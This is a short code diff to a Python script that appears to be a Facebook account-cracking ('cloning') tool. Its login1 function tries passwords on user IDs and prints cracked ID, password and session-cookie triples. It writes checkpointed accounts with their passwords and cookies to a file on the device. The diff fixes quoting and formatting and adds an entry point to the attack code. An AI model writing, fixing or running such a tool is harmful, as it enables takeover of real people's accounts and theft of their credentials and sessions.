@@ -448,15 +448,19 @@ def login1(uid):
                 print(f'\r\033[38;5;46m[MAAZ-OK] {uid} ● {pw} ● COOKIE={cookies}\033[1;97m')
                 break
 
-            # ✅ Agar Checkpoint (CP)
+            # ✅ CP case
             elif "www.facebook.com" in rp.get('error', {}).get('message', ''):
-                cookies = ";".join([f"{i.get("name")}={i.get("value")}" for i in rp.get("session_cookies", [])]) if "session_cookies" in rp else "NO-COOKIE"
+                cookies = ";".join([f"{i.get('name')}={i.get('value')}" for i in rp.get('session_cookies', [])]) if "session_cookies" in rp else "NO-COOKIE"
                 cps.append(uid)
                 open("/sdcard/OLD_CLONING-CP.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
-                print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw} ● COOKIE={cookies}\033[1;97m')             
+                print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw} ● COOKIE={cookies}\033[1;97m')
                 break
+
             else:
                 continue
         loop += 1
     except Exception as e:
         time.sleep(10)
+
+if __name__ == "__main__":
+    main()		
